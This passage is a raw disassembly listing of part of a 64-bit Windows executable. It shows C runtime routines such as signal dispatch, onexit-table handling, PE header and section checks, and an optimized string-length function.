   140003c1c:	33 f6                	xor    %esi,%esi
   140003c1e:	eb 0d                	jmp    0x140003c2d
   140003c20:	49 89 5c fd 00       	mov    %rbx,0x0(%r13,%rdi,8)
   140003c25:	eb 06                	jmp    0x140003c2d
   140003c27:	e8 c0 e1 ff ff       	call   0x140001dec
   140003c2c:	90                   	nop
   140003c2d:	48 8b 0d 4c 76 00 00 	mov    0x764c(%rip),%rcx        # 0x14000b280
   140003c34:	ff 15 f6 45 00 00    	call   *0x45f6(%rip)        # 0x140008230
   140003c3a:	eb 83                	jmp    0x140003bbf
   140003c3c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003c41:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140003c46:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140003c4b:	48 83 c4 20          	add    $0x20,%rsp
   140003c4f:	41 5d                	pop    %r13
   140003c51:	c3                   	ret
   140003c52:	cc                   	int3
   140003c53:	cc                   	int3
   140003c54:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003c59:	57                   	push   %rdi
   140003c5a:	48 83 ec 20          	sub    $0x20,%rsp
   140003c5e:	48 63 d9             	movslq %ecx,%rbx
   140003c61:	48 8d 3d 78 75 00 00 	lea    0x7578(%rip),%rdi        # 0x14000b1e0
   140003c68:	48 03 db             	add    %rbx,%rbx
   140003c6b:	48 83 3c df 00       	cmpq   $0x0,(%rdi,%rbx,8)
   140003c70:	75 11                	jne    0x140003c83
   140003c72:	e8 f5 fe ff ff       	call   0x140003b6c
   140003c77:	85 c0                	test   %eax,%eax
   140003c79:	75 08                	jne    0x140003c83
   140003c7b:	8d 48 11             	lea    0x11(%rax),%ecx
   140003c7e:	e8 69 e8 ff ff       	call   0x1400024ec
   140003c83:	48 8b 0c df          	mov    (%rdi,%rbx,8),%rcx
   140003c87:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003c8c:	48 83 c4 20          	add    $0x20,%rsp
   140003c90:	5f                   	pop    %rdi
   140003c91:	48 ff 25 80 44 00 00 	rex.W jmp *0x4480(%rip)        # 0x140008118
   140003c98:	48 83 ec 28          	sub    $0x28,%rsp
   140003c9c:	e8 ff f8 ff ff       	call   0x1400035a0
   140003ca1:	48 8b 88 d0 00 00 00 	mov    0xd0(%rax),%rcx
   140003ca8:	48 85 c9             	test   %rcx,%rcx
   140003cab:	74 04                	je     0x140003cb1
   140003cad:	ff d1                	call   *%rcx
   140003caf:	eb 00                	jmp    0x140003cb1
   140003cb1:	e8 56 1d 00 00       	call   0x140005a0c
   140003cb6:	48 83 c4 28          	add    $0x28,%rsp
   140003cba:	c3                   	ret
   140003cbb:	cc                   	int3
   140003cbc:	48 83 ec 28          	sub    $0x28,%rsp
   140003cc0:	48 8d 0d d1 ff ff ff 	lea    -0x2f(%rip),%rcx        # 0x140003c98
   140003cc7:	ff 15 b3 44 00 00    	call   *0x44b3(%rip)        # 0x140008180
   140003ccd:	48 89 05 8c 8e 00 00 	mov    %rax,0x8e8c(%rip)        # 0x14000cb60
   140003cd4:	48 83 c4 28          	add    $0x28,%rsp
   140003cd8:	c3                   	ret
   140003cd9:	cc                   	int3
   140003cda:	cc                   	int3
   140003cdb:	cc                   	int3
   140003cdc:	48 89 0d 85 8e 00 00 	mov    %rcx,0x8e85(%rip)        # 0x14000cb68
   140003ce3:	48 89 0d 86 8e 00 00 	mov    %rcx,0x8e86(%rip)        # 0x14000cb70
   140003cea:	48 89 0d 87 8e 00 00 	mov    %rcx,0x8e87(%rip)        # 0x14000cb78
   140003cf1:	48 89 0d 88 8e 00 00 	mov    %rcx,0x8e88(%rip)        # 0x14000cb80
   140003cf8:	c3                   	ret
   140003cf9:	cc                   	int3
   140003cfa:	cc                   	int3
   140003cfb:	cc                   	int3
   140003cfc:	48 8b 0d 75 8e 00 00 	mov    0x8e75(%rip),%rcx        # 0x14000cb78
   140003d03:	48 ff 25 5e 44 00 00 	rex.W jmp *0x445e(%rip)        # 0x140008168
   140003d0a:	cc                   	int3
   140003d0b:	cc                   	int3
   140003d0c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003d11:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003d16:	57                   	push   %rdi
   140003d17:	41 54                	push   %r12
   140003d19:	41 55                	push   %r13
   140003d1b:	41 56                	push   %r14
   140003d1d:	41 57                	push   %r15
   140003d1f:	48 83 ec 30          	sub    $0x30,%rsp
   140003d23:	8b d9                	mov    %ecx,%ebx
   140003d25:	33 ff                	xor    %edi,%edi
   140003d27:	89 7c 24 60          	mov    %edi,0x60(%rsp)
   140003d2b:	33 f6                	xor    %esi,%esi
   140003d2d:	8b d1                	mov    %ecx,%edx
   140003d2f:	83 ea 02             	sub    $0x2,%edx
   140003d32:	0f 84 c5 00 00 00    	je     0x140003dfd
   140003d38:	83 ea 02             	sub    $0x2,%edx
   140003d3b:	74 62                	je     0x140003d9f
   140003d3d:	83 ea 02             	sub    $0x2,%edx
   140003d40:	74 4d                	je     0x140003d8f
   140003d42:	83 ea 02             	sub    $0x2,%edx
   140003d45:	74 58                	je     0x140003d9f
   140003d47:	83 ea 03             	sub    $0x3,%edx
   140003d4a:	74 53                	je     0x140003d9f
   140003d4c:	83 ea 04             	sub    $0x4,%edx
   140003d4f:	74 2e                	je     0x140003d7f
   140003d51:	83 ea 06             	sub    $0x6,%edx
   140003d54:	74 16                	je     0x140003d6c
   140003d56:	ff ca                	dec    %edx
   140003d58:	74 35                	je     0x140003d8f
   140003d5a:	e8 7d e3 ff ff       	call   0x1400020dc
   140003d5f:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140003d65:	e8 be fc ff ff       	call   0x140003a28
   140003d6a:	eb 40                	jmp    0x140003dac
   140003d6c:	4c 8d 25 fd 8d 00 00 	lea    0x8dfd(%rip),%r12        # 0x14000cb70
   140003d73:	48 8b 0d f6 8d 00 00 	mov    0x8df6(%rip),%rcx        # 0x14000cb70
   140003d7a:	e9 8c 00 00 00       	jmp    0x140003e0b
   140003d7f:	4c 8d 25 fa 8d 00 00 	lea    0x8dfa(%rip),%r12        # 0x14000cb80
   140003d86:	48 8b 0d f3 8d 00 00 	mov    0x8df3(%rip),%rcx        # 0x14000cb80
   140003d8d:	eb 7c                	jmp    0x140003e0b
   140003d8f:	4c 8d 25 e2 8d 00 00 	lea    0x8de2(%rip),%r12        # 0x14000cb78
   140003d96:	48 8b 0d db 8d 00 00 	mov    0x8ddb(%rip),%rcx        # 0x14000cb78
   140003d9d:	eb 6c                	jmp    0x140003e0b
   140003d9f:	e8 78 f7 ff ff       	call   0x14000351c
   140003da4:	48 8b f0             	mov    %rax,%rsi
   140003da7:	48 85 c0             	test   %rax,%rax
   140003daa:	75 08                	jne    0x140003db4
   140003dac:	83 c8 ff             	or     $0xffffffff,%eax
   140003daf:	e9 72 01 00 00       	jmp    0x140003f26
   140003db4:	48 8b 90 a0 00 00 00 	mov    0xa0(%rax),%rdx
   140003dbb:	48 8b ca             	mov    %rdx,%rcx
   140003dbe:	4c 63 05 17 52 00 00 	movslq 0x5217(%rip),%r8        # 0x140008fdc
   140003dc5:	39 59 04             	cmp    %ebx,0x4(%rcx)
   140003dc8:	74 13                	je     0x140003ddd
   140003dca:	48 83 c1 10          	add    $0x10,%rcx
   140003dce:	49 8b c0             	mov    %r8,%rax
   140003dd1:	48 c1 e0 04          	shl    $0x4,%rax
   140003dd5:	48 03 c2             	add    %rdx,%rax
   140003dd8:	48 3b c8             	cmp    %rax,%rcx
   140003ddb:	72 e8                	jb     0x140003dc5
   140003ddd:	49 8b c0             	mov    %r8,%rax
   140003de0:	48 c1 e0 04          	shl    $0x4,%rax
   140003de4:	48 03 c2             	add    %rdx,%rax
   140003de7:	48 3b c8             	cmp    %rax,%rcx
   140003dea:	73 05                	jae    0x140003df1
   140003dec:	39 59 04             	cmp    %ebx,0x4(%rcx)
   140003def:	74 02                	je     0x140003df3
   140003df1:	33 c9                	xor    %ecx,%ecx
   140003df3:	4c 8d 61 08          	lea    0x8(%rcx),%r12
   140003df7:	4d 8b 2c 24          	mov    (%r12),%r13
   140003dfb:	eb 20                	jmp    0x140003e1d
   140003dfd:	4c 8d 25 64 8d 00 00 	lea    0x8d64(%rip),%r12        # 0x14000cb68
   140003e04:	48 8b 0d 5d 8d 00 00 	mov    0x8d5d(%rip),%rcx        # 0x14000cb68
   140003e0b:	bf 01 00 00 00       	mov    $0x1,%edi
   140003e10:	89 7c 24 60          	mov    %edi,0x60(%rsp)
   140003e14:	ff 15 4e 43 00 00    	call   *0x434e(%rip)        # 0x140008168
   140003e1a:	4c 8b e8             	mov    %rax,%r13
   140003e1d:	49 83 fd 01          	cmp    $0x1,%r13
   140003e21:	75 07                	jne    0x140003e2a
   140003e23:	33 c0                	xor    %eax,%eax
   140003e25:	e9 fc 00 00 00       	jmp    0x140003f26
   140003e2a:	4d 85 ed             	test   %r13,%r13
   140003e2d:	75 0a                	jne    0x140003e39
   140003e2f:	41 8d 4d 03          	lea    0x3(%r13),%ecx
   140003e33:	e8 88 e6 ff ff       	call   0x1400024c0
   140003e38:	cc                   	int3
   140003e39:	85 ff                	test   %edi,%edi
   140003e3b:	74 08                	je     0x140003e45
   140003e3d:	33 c9                	xor    %ecx,%ecx
   140003e3f:	e8 10 fe ff ff       	call   0x140003c54
   140003e44:	90                   	nop
   140003e45:	83 fb 08             	cmp    $0x8,%ebx
   140003e48:	74 11                	je     0x140003e5b
   140003e4a:	83 fb 0b             	cmp    $0xb,%ebx
   140003e4d:	74 0c                	je     0x140003e5b
   140003e4f:	83 fb 04             	cmp    $0x4,%ebx
   140003e52:	74 07                	je     0x140003e5b
   140003e54:	4c 8b 7c 24 28       	mov    0x28(%rsp),%r15
   140003e59:	eb 2c                	jmp    0x140003e87
   140003e5b:	4c 8b be a8 00 00 00 	mov    0xa8(%rsi),%r15
   140003e62:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   140003e67:	48 83 a6 a8 00 00 00 	andq   $0x0,0xa8(%rsi)
   140003e6e:	00 
   140003e6f:	83 fb 08             	cmp    $0x8,%ebx
   140003e72:	75 13                	jne    0x140003e87
   140003e74:	44 8b b6 b0 00 00 00 	mov    0xb0(%rsi),%r14d
   140003e7b:	c7 86 b0 00 00 00 8c 	movl   $0x8c,0xb0(%rsi)
   140003e82:	00 00 00 
   140003e85:	eb 05                	jmp    0x140003e8c
   140003e87:	44 8b 74 24 60       	mov    0x60(%rsp),%r14d
   140003e8c:	83 fb 08             	cmp    $0x8,%ebx
   140003e8f:	75 39                	jne    0x140003eca
   140003e91:	8b 0d 39 51 00 00    	mov    0x5139(%rip),%ecx        # 0x140008fd0
   140003e97:	8b d1                	mov    %ecx,%edx
   140003e99:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140003e9d:	8b 05 31 51 00 00    	mov    0x5131(%rip),%eax        # 0x140008fd4
   140003ea3:	03 c8                	add    %eax,%ecx
   140003ea5:	3b d1                	cmp    %ecx,%edx
   140003ea7:	7d 2a                	jge    0x140003ed3
   140003ea9:	48 63 ca             	movslq %edx,%rcx
   140003eac:	48 03 c9             	add    %rcx,%rcx
   140003eaf:	48 8b 86 a0 00 00 00 	mov    0xa0(%rsi),%rax
   140003eb6:	48 83 64 c8 08 00    	andq   $0x0,0x8(%rax,%rcx,8)
   140003ebc:	ff c2                	inc    %edx
   140003ebe:	89 54 24 20          	mov    %edx,0x20(%rsp)
   140003ec2:	8b 0d 08 51 00 00    	mov    0x5108(%rip),%ecx        # 0x140008fd0
   140003ec8:	eb d3                	jmp    0x140003e9d
   140003eca:	e8 61 f5 ff ff       	call   0x140003430
   140003ecf:	49 89 04 24          	mov    %rax,(%r12)
   140003ed3:	85 ff                	test   %edi,%edi
   140003ed5:	74 07                	je     0x140003ede
   140003ed7:	33 c9                	xor    %ecx,%ecx
   140003ed9:	e8 76 fc ff ff       	call   0x140003b54
   140003ede:	bf 08 00 00 00       	mov    $0x8,%edi
   140003ee3:	3b df                	cmp    %edi,%ebx
   140003ee5:	75 0d                	jne    0x140003ef4
   140003ee7:	8b 96 b0 00 00 00    	mov    0xb0(%rsi),%edx
   140003eed:	8b cf                	mov    %edi,%ecx
   140003eef:	41 ff d5             	call   *%r13
   140003ef2:	eb 05                	jmp    0x140003ef9
   140003ef4:	8b cb                	mov    %ebx,%ecx
   140003ef6:	41 ff d5             	call   *%r13
   140003ef9:	3b df                	cmp    %edi,%ebx
   140003efb:	74 0e                	je     0x140003f0b
   140003efd:	83 fb 0b             	cmp    $0xb,%ebx
   140003f00:	74 09                	je     0x140003f0b
   140003f02:	83 fb 04             	cmp    $0x4,%ebx
   140003f05:	0f 85 18 ff ff ff    	jne    0x140003e23
   140003f0b:	4c 89 be a8 00 00 00 	mov    %r15,0xa8(%rsi)
   140003f12:	3b df                	cmp    %edi,%ebx
   140003f14:	0f 85 09 ff ff ff    	jne    0x140003e23
   140003f1a:	44 89 b6 b0 00 00 00 	mov    %r14d,0xb0(%rsi)
   140003f21:	e9 fd fe ff ff       	jmp    0x140003e23
   140003f26:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140003f2b:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140003f30:	48 83 c4 30          	add    $0x30,%rsp
   140003f34:	41 5f                	pop    %r15
   140003f36:	41 5e                	pop    %r14
   140003f38:	41 5d                	pop    %r13
   140003f3a:	41 5c                	pop    %r12
   140003f3c:	5f                   	pop    %rdi
   140003f3d:	c3                   	ret
   140003f3e:	cc                   	int3
   140003f3f:	cc                   	int3
   140003f40:	48 89 0d 49 8c 00 00 	mov    %rcx,0x8c49(%rip)        # 0x14000cb90
   140003f47:	c3                   	ret
   140003f48:	48 89 0d 49 8c 00 00 	mov    %rcx,0x8c49(%rip)        # 0x14000cb98
   140003f4f:	c3                   	ret
   140003f50:	40 53                	rex push %rbx
   140003f52:	48 83 ec 20          	sub    $0x20,%rsp
   140003f56:	ba 08 00 00 00       	mov    $0x8,%edx
   140003f5b:	8d 4a 18             	lea    0x18(%rdx),%ecx
   140003f5e:	e8 e1 08 00 00       	call   0x140004844
   140003f63:	48 8b c8             	mov    %rax,%rcx
   140003f66:	48 8b d8             	mov    %rax,%rbx
   140003f69:	ff 15 11 42 00 00    	call   *0x4211(%rip)        # 0x140008180
   140003f6f:	48 89 05 42 94 00 00 	mov    %rax,0x9442(%rip)        # 0x14000d3b8
   140003f76:	48 89 05 33 94 00 00 	mov    %rax,0x9433(%rip)        # 0x14000d3b0
   140003f7d:	48 85 db             	test   %rbx,%rbx
   140003f80:	75 05                	jne    0x140003f87
   140003f82:	8d 43 18             	lea    0x18(%rbx),%eax
   140003f85:	eb 06                	jmp    0x140003f8d
   140003f87:	48 83 23 00          	andq   $0x0,(%rbx)
   140003f8b:	33 c0                	xor    %eax,%eax
   140003f8d:	48 83 c4 20          	add    $0x20,%rsp
   140003f91:	5b                   	pop    %rbx
   140003f92:	c3                   	ret
   140003f93:	cc                   	int3
   140003f94:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003f99:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003f9e:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140003fa3:	41 54                	push   %r12
   140003fa5:	41 55                	push   %r13
   140003fa7:	41 56                	push   %r14
   140003fa9:	48 83 ec 20          	sub    $0x20,%rsp
   140003fad:	4c 8b f1             	mov    %rcx,%r14
   140003fb0:	e8 f3 e1 ff ff       	call   0x1400021a8
   140003fb5:	90                   	nop
   140003fb6:	48 8b 0d fb 93 00 00 	mov    0x93fb(%rip),%rcx        # 0x14000d3b8
   140003fbd:	ff 15 a5 41 00 00    	call   *0x41a5(%rip)        # 0x140008168
   140003fc3:	4c 8b e0             	mov    %rax,%r12
   140003fc6:	48 8b 0d e3 93 00 00 	mov    0x93e3(%rip),%rcx        # 0x14000d3b0
   140003fcd:	ff 15 95 41 00 00    	call   *0x4195(%rip)        # 0x140008168
   140003fd3:	48 8b d8             	mov    %rax,%rbx
   140003fd6:	49 3b c4             	cmp    %r12,%rax
   140003fd9:	0f 82 9b 00 00 00    	jb     0x14000407a
   140003fdf:	48 8b f8             	mov    %rax,%rdi
   140003fe2:	49 2b fc             	sub    %r12,%rdi
   140003fe5:	4c 8d 6f 08          	lea    0x8(%rdi),%r13
   140003fe9:	49 83 fd 08          	cmp    $0x8,%r13
   140003fed:	0f 82 87 00 00 00    	jb     0x14000407a
   140003ff3:	49 8b cc             	mov    %r12,%rcx
   140003ff6:	e8 51 1a 00 00       	call   0x140005a4c
   140003ffb:	48 8b f0             	mov    %rax,%rsi
   140003ffe:	49 3b c5             	cmp    %r13,%rax
   140004001:	73 55                	jae    0x140004058
   140004003:	ba 00 10 00 00       	mov    $0x1000,%edx
   140004008:	48 3b c2             	cmp    %rdx,%rax
   14000400b:	48 0f 42 d0          	cmovb  %rax,%rdx
   14000400f:	48 03 d0             	add    %rax,%rdx
   140004012:	48 3b d0             	cmp    %rax,%rdx
   140004015:	72 11                	jb     0x140004028
   140004017:	49 8b cc             	mov    %r12,%rcx
   14000401a:	e8 a9 08 00 00       	call   0x1400048c8
   14000401f:	33 db                	xor    %ebx,%ebx
   140004021:	48 85 c0             	test   %rax,%rax
   140004024:	75 1a                	jne    0x140004040
   140004026:	eb 02                	jmp    0x14000402a
   140004028:	33 db                	xor    %ebx,%ebx
   14000402a:	48 8d 56 20          	lea    0x20(%rsi),%rdx
   14000402e:	48 3b d6             	cmp    %rsi,%rdx
   140004031:	72 49                	jb     0x14000407c
   140004033:	49 8b cc             	mov    %r12,%rcx
   140004036:	e8 8d 08 00 00       	call   0x1400048c8
   14000403b:	48 85 c0             	test   %rax,%rax
   14000403e:	74 3c                	je     0x14000407c
   140004040:	48 c1 ff 03          	sar    $0x3,%rdi
   140004044:	48 8d 1c f8          	lea    (%rax,%rdi,8),%rbx
   140004048:	48 8b c8             	mov    %rax,%rcx
   14000404b:	ff 15 2f 41 00 00    	call   *0x412f(%rip)        # 0x140008180
   140004051:	48 89 05 60 93 00 00 	mov    %rax,0x9360(%rip)        # 0x14000d3b8
   140004058:	49 8b ce             	mov    %r14,%rcx
   14000405b:	ff 15 1f 41 00 00    	call   *0x411f(%rip)        # 0x140008180
   140004061:	48 89 03             	mov    %rax,(%rbx)
   140004064:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   140004068:	ff 15 12 41 00 00    	call   *0x4112(%rip)        # 0x140008180
   14000406e:	48 89 05 3b 93 00 00 	mov    %rax,0x933b(%rip)        # 0x14000d3b0
   140004075:	49 8b de             	mov    %r14,%rbx
   140004078:	eb 02                	jmp    0x14000407c
   14000407a:	33 db                	xor    %ebx,%ebx
   14000407c:	e8 33 e1 ff ff       	call   0x1400021b4
   140004081:	48 8b c3             	mov    %rbx,%rax
   140004084:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004089:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000408e:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140004093:	48 83 c4 20          	add    $0x20,%rsp
   140004097:	41 5e                	pop    %r14
   140004099:	41 5d                	pop    %r13
   14000409b:	41 5c                	pop    %r12
   14000409d:	c3                   	ret
   14000409e:	cc                   	int3
   14000409f:	cc                   	int3
   1400040a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400040a4:	e8 eb fe ff ff       	call   0x140003f94
   1400040a9:	48 f7 d8             	neg    %rax
   1400040ac:	1b c0                	sbb    %eax,%eax
   1400040ae:	f7 d8                	neg    %eax
   1400040b0:	ff c8                	dec    %eax
   1400040b2:	48 83 c4 28          	add    $0x28,%rsp
   1400040b6:	c3                   	ret
   1400040b7:	cc                   	int3
   1400040b8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400040bd:	57                   	push   %rdi
   1400040be:	48 83 ec 20          	sub    $0x20,%rsp
   1400040c2:	48 8d 1d 57 73 00 00 	lea    0x7357(%rip),%rbx        # 0x14000b420
   1400040c9:	bf 0a 00 00 00       	mov    $0xa,%edi
   1400040ce:	48 8b 0b             	mov    (%rbx),%rcx
   1400040d1:	ff 15 a9 40 00 00    	call   *0x40a9(%rip)        # 0x140008180
   1400040d7:	48 89 03             	mov    %rax,(%rbx)
   1400040da:	48 83 c3 08          	add    $0x8,%rbx
   1400040de:	48 ff cf             	dec    %rdi
   1400040e1:	75 eb                	jne    0x1400040ce
   1400040e3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400040e8:	48 83 c4 20          	add    $0x20,%rsp
   1400040ec:	5f                   	pop    %rdi
   1400040ed:	c3                   	ret
   1400040ee:	cc                   	int3
   1400040ef:	cc                   	int3
   1400040f0:	48 8b c1             	mov    %rcx,%rax
   1400040f3:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   1400040f8:	66 39 08             	cmp    %cx,(%rax)
   1400040fb:	74 03                	je     0x140004100
   1400040fd:	33 c0                	xor    %eax,%eax
   1400040ff:	c3                   	ret
   140004100:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140004104:	48 03 c8             	add    %rax,%rcx
   140004107:	33 c0                	xor    %eax,%eax
   140004109:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   14000410f:	75 0c                	jne    0x14000411d
   140004111:	ba 0b 02 00 00       	mov    $0x20b,%edx
   140004116:	66 39 51 18          	cmp    %dx,0x18(%rcx)
   14000411a:	0f 94 c0             	sete   %al
   14000411d:	f3 c3                	repz ret
   14000411f:	cc                   	int3
   140004120:	4c 63 41 3c          	movslq 0x3c(%rcx),%r8
   140004124:	45 33 c9             	xor    %r9d,%r9d
   140004127:	4c 8b d2             	mov    %rdx,%r10
   14000412a:	4c 03 c1             	add    %rcx,%r8
   14000412d:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   140004132:	45 0f b7 58 06       	movzwl 0x6(%r8),%r11d
   140004137:	4a 8d 4c 00 18       	lea    0x18(%rax,%r8,1),%rcx
   14000413c:	45 85 db             	test   %r11d,%r11d
   14000413f:	74 1e                	je     0x14000415f
   140004141:	8b 51 0c             	mov    0xc(%rcx),%edx
   140004144:	4c 3b d2             	cmp    %rdx,%r10
   140004147:	72 0a                	jb     0x140004153
   140004149:	8b 41 08             	mov    0x8(%rcx),%eax
   14000414c:	03 c2                	add    %edx,%eax
   14000414e:	4c 3b d0             	cmp    %rax,%r10
   140004151:	72 0f                	jb     0x140004162
   140004153:	41 ff c1             	inc    %r9d
   140004156:	48 83 c1 28          	add    $0x28,%rcx
   14000415a:	45 3b cb             	cmp    %r11d,%r9d
   14000415d:	72 e2                	jb     0x140004141
   14000415f:	33 c0                	xor    %eax,%eax
   140004161:	c3                   	ret
   140004162:	48 8b c1             	mov    %rcx,%rax
   140004165:	c3                   	ret
   140004166:	cc                   	int3
   140004167:	cc                   	int3
   140004168:	cc                   	int3
   140004169:	cc                   	int3
   14000416a:	cc                   	int3
   14000416b:	cc                   	int3
   14000416c:	cc                   	int3
   14000416d:	cc                   	int3
   14000416e:	cc                   	int3
   14000416f:	cc                   	int3
   140004170:	48 83 ec 28          	sub    $0x28,%rsp
   140004174:	4c 8b c1             	mov    %rcx,%r8
   140004177:	4c 8d 0d 82 be ff ff 	lea    -0x417e(%rip),%r9        # 0x140000000
   14000417e:	49 8b c9             	mov    %r9,%rcx
   140004181:	e8 6a ff ff ff       	call   0x1400040f0
   140004186:	85 c0                	test   %eax,%eax
   140004188:	74 22                	je     0x1400041ac
   14000418a:	4d 2b c1             	sub    %r9,%r8
   14000418d:	49 8b d0             	mov    %r8,%rdx
   140004190:	49 8b c9             	mov    %r9,%rcx
   140004193:	e8 88 ff ff ff       	call   0x140004120
   140004198:	48 85 c0             	test   %rax,%rax
   14000419b:	74 0f                	je     0x1400041ac
   14000419d:	8b 40 24             	mov    0x24(%rax),%eax
   1400041a0:	c1 e8 1f             	shr    $0x1f,%eax
   1400041a3:	f7 d0                	not    %eax
   1400041a5:	83 e0 01             	and    $0x1,%eax
   1400041a8:	eb 02                	jmp    0x1400041ac
   1400041aa:	33 c0                	xor    %eax,%eax
   1400041ac:	48 83 c4 28          	add    $0x28,%rsp
   1400041b0:	c3                   	ret
   1400041b1:	cc                   	int3
   1400041b2:	cc                   	int3
   1400041b3:	cc                   	int3
   1400041b4:	40 53                	rex push %rbx
   1400041b6:	48 83 ec 20          	sub    $0x20,%rsp
   1400041ba:	45 8b 18             	mov    (%r8),%r11d
   1400041bd:	48 8b da             	mov    %rdx,%rbx
   1400041c0:	4c 8b c9             	mov    %rcx,%r9
   1400041c3:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   1400041c7:	41 f6 00 04          	testb  $0x4,(%r8)
   1400041cb:	4c 8b d1             	mov    %rcx,%r10
   1400041ce:	74 13                	je     0x1400041e3
   1400041d0:	41 8b 40 08          	mov    0x8(%r8),%eax
   1400041d4:	4d 63 50 04          	movslq 0x4(%r8),%r10
   1400041d8:	f7 d8                	neg    %eax
   1400041da:	4c 03 d1             	add    %rcx,%r10
   1400041dd:	48 63 c8             	movslq %eax,%rcx
   1400041e0:	4c 23 d1             	and    %rcx,%r10
   1400041e3:	49 63 c3             	movslq %r11d,%rax
   1400041e6:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   1400041ea:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1400041ee:	8b 48 08             	mov    0x8(%rax),%ecx
   1400041f1:	48 03 4b 08          	add    0x8(%rbx),%rcx
   1400041f5:	f6 41 03 0f          	testb  $0xf,0x3(%rcx)
   1400041f9:	74 0c                	je     0x140004207
   1400041fb:	0f b6 41 03          	movzbl 0x3(%rcx),%eax
   1400041ff:	83 e0 f0             	and    $0xfffffff0,%eax
   140004202:	48 98                	cltq
   140004204:	4c 03 c8             	add    %rax,%r9
   140004207:	4c 33 ca             	xor    %rdx,%r9
   14000420a:	49 8b c9             	mov    %r9,%rcx
   14000420d:	48 83 c4 20          	add    $0x20,%rsp
   140004211:	5b                   	pop    %rbx
   140004212:	e9 19 05 00 00       	jmp    0x140004730
   140004217:	cc                   	int3
   140004218:	48 83 ec 28          	sub    $0x28,%rsp
   14000421c:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140004220:	48 8b ca             	mov    %rdx,%rcx
   140004223:	49 8b d1             	mov    %r9,%rdx
   140004226:	e8 89 ff ff ff       	call   0x1400041b4
   14000422b:	b8 01 00 00 00       	mov    $0x1,%eax
   140004230:	48 83 c4 28          	add    $0x28,%rsp
   140004234:	c3                   	ret
   140004235:	cc                   	int3
   140004236:	cc                   	int3
   140004237:	cc                   	int3
   140004238:	cc                   	int3
   140004239:	cc                   	int3
   14000423a:	cc                   	int3
   14000423b:	cc                   	int3
   14000423c:	cc                   	int3
   14000423d:	cc                   	int3
   14000423e:	cc                   	int3
   14000423f:	cc                   	int3
   140004240:	cc                   	int3
   140004241:	cc                   	int3
   140004242:	cc                   	int3
   140004243:	cc                   	int3
   140004244:	cc                   	int3
   140004245:	cc                   	int3
   140004246:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000424d:	00 00 00 
   140004250:	48 8b c1             	mov    %rcx,%rax
   140004253:	48 f7 d9             	neg    %rcx
   140004256:	48 a9 07 00 00 00    	test   $0x7,%rax
   14000425c:	74 0f                	je     0x14000426d
   14000425e:	66 90                	xchg   %ax,%ax
   140004260:	8a 10                	mov    (%rax),%dl
   140004262:	48 ff c0             	inc    %rax
   140004265:	84 d2                	test   %dl,%dl
   140004267:	74 5f                	je     0x1400042c8
   140004269:	a8 07                	test   $0x7,%al
   14000426b:	75 f3                	jne    0x140004260
   14000426d:	49 b8 ff fe fe fe fe 	movabs $0x7efefefefefefeff,%r8
   140004274:	fe fe 7e 
   140004277:	49 bb 00 01 01 01 01 	movabs $0x8101010101010100,%r11
   14000427e:	01 01 81 
   140004281:	48 8b 10             	mov    (%rax),%rdx
   140004284:	4d 8b c8             	mov    %r8,%r9
   140004287:	48 83 c0 08          	add    $0x8,%rax
   14000428b:	4c 03 ca             	add    %rdx,%r9
   14000428e:	48 f7 d2             	not    %rdx
   140004291:	49 33 d1             	xor    %r9,%rdx
   140004294:	49 23 d3             	and    %r11,%rdx
   140004297:	74 e8                	je     0x140004281
   140004299:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   14000429d:	84 d2                	test   %dl,%dl
   14000429f:	74 51                	je     0x1400042f2
   1400042a1:	84 f6                	test   %dh,%dh
   1400042a3:	74 47                	je     0x1400042ec
   1400042a5:	48 c1 ea 10          	shr    $0x10,%rdx
   1400042a9:	84 d2                	test   %dl,%dl
   1400042ab:	74 39                	je     0x1400042e6
   1400042ad:	84 f6                	test   %dh,%dh
   1400042af:	74 2f                	je     0x1400042e0
   1400042b1:	48 c1 ea 10          	shr    $0x10,%rdx
   1400042b5:	84 d2                	test   %dl,%dl
   1400042b7:	74 21                	je     0x1400042da
   1400042b9:	84 f6                	test   %dh,%dh
   1400042bb:	74 17                	je     0x1400042d4
   1400042bd:	c1 ea 10             	shr    $0x10,%edx
   1400042c0:	84 d2                	test   %dl,%dl
   1400042c2:	74 0a                	je     0x1400042ce
   1400042c4:	84 f6                	test   %dh,%dh
   1400042c6:	75 b9                	jne    0x140004281
   1400042c8:	48 8d 44 01 ff       	lea    -0x1(%rcx,%rax,1),%rax
   1400042cd:	c3                   	ret
   1400042ce:	48 8d 44 01 fe       	lea    -0x2(%rcx,%rax,1),%rax
   1400042d3:	c3                   	ret
   1400042d4:	48 8d 44 01 fd       	lea    -0x3(%rcx,%rax,1),%rax
   1400042d9:	c3                   	ret
   1400042da:	48 8d 44 01 fc       	lea    -0x4(%rcx,%rax,1),%rax
